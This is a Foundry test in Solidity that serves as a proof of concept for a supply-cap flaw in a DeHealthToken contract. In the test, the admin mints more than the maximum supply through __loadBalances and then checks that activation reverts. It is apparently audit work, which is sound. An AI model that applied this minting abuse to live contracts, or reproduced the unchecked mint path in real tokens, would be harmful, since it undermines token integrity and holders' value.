// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DeHealthToken.sol";

contract DeHealthTokenTest is Test {
    DeHealthToken token;
    address admin = makeAddr("admin");
    address user1 = makeAddr("user1");
    uint256 constant MAX_SUPPLY = 1_000_000_000 * 1e18;
    uint256 constant EXCESSIVE_AMOUNT = MAX_SUPPLY + 1;

    function setUp() public {
        vm.startPrank(admin);
        token = new DeHealthToken();
        token.initialize(admin);
        token.grantRole(token.DEFAULT_ADMIN_ROLE(), admin);
        vm.stopPrank();
    }

    function testTokenActivationFailureDueToExcessiveMinting() public {
        vm.startPrank(admin);
        
        address[] memory addresses = new address[](1);
        addresses[0] = user1;
        
        uint256[] memory balances = new uint256[](1);
        balances[0] = EXCESSIVE_AMOUNT;

        console.log("--- BEFORE-Trigger totalSupply ---");
        uint256 supplyBefore = token.totalSupply();
        console.log("Supply before minting:", supplyBefore);

        // Trigger vulnerability: mint tokens exceeding max supply
        console.log("--- Trigger __loadBalances ---");
        token.__loadBalances(addresses, balances);

        console.log("--- AFTER-Trigger totalSupply ---");
        uint256 supplyAfter = token.totalSupply();
        uint256 actualIncrease = supplyAfter - supplyBefore;
        console.log("Supply after minting:", supplyAfter);
        console.log("Expected increase:", EXCESSIVE_AMOUNT);
        console.log("Actual increase:", actualIncrease);

        bool vulnerabilityExists = actualIncrease == EXCESSIVE_AMOUNT;
        console.log("Vulnerability verification:", vulnerabilityExists ? "EXISTS - Excessive mint succeeded" : "DOES NOT EXIST - Minting failed");

        // Verify activation reverted due to underflow
        vm.expectRevert();
        token.__activate();
        
        vm.stopPrank();

        // Validate token supply exceeded maximum
        assertEq(token.totalSupply(), EXCESSIVE_AMOUNT, "Total supply should exceed max supply");
        
        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Successfully minted tokens beyond max supply limit");
        } else {
            console.log("Vulnerability not Exist: Failed to mint excessive tokens beyond max supply");
        }
    }
}